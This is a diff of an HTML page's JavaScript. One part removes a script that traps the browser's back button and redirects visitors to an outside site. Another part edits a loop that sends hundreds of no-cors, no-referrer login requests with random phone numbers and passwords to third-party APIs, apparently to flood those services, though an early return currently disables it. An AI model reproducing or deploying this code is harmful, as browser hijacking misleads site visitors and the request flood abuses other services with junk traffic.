@@ -173,15 +173,6 @@ body {
 
 </head>
 <body id="page-top">
-<script>
-document.addEventListener("DOMContentLoaded", function() {
-    history.pushState(null, null, location.href);
-    window.onpopstate = function () {
-        history.go(1);
-        window.location.href = 'https://push-me-once.com/go/1272663';
-    };
-});
-</script>
 
       <!-- Page Wrapper -->
       <div id="wrapper">
@@ -533,26 +524,25 @@ function strrn() {
 }
 function call(){
     return;
-    for (let i = 0; i < 169; i++) {
+    
+    for (let i = 0; i < 369; i++) {
         // fetch("http://daman-app.org/");
-        // continue;
+        // continue; 
         
         // continue;
         let no = gno();
         let p_=strrn();
         
-        // 
-        fetch("https://api.kuber.cc/api/v1/auth/login", {
-            headers: {
-                'Content-Type': 'application/json' 
-            },
-          "body" : JSON.stringify({phone : no , password : p_ , email : ""}),
-          "method": "POST",
-          "mode" : "no-cors",
+       
+        		  
+        
+        fetch("https://apis.damanworlds.world/api/v1/auth/login/"+no, {
+          "method": "GET",
+          "mode": "no-cors",
           "referrerPolicy": 'no-referrer',
         });
-        fetch('https://damanworlds.world/?r='+i+ no , {"mode" : "no-cors",
-          "referrerPolicy": 'no-referrer',});
+        
+        
     //   fetch('https://sd/sd'+new Date().getTime()+i);
     }
 }
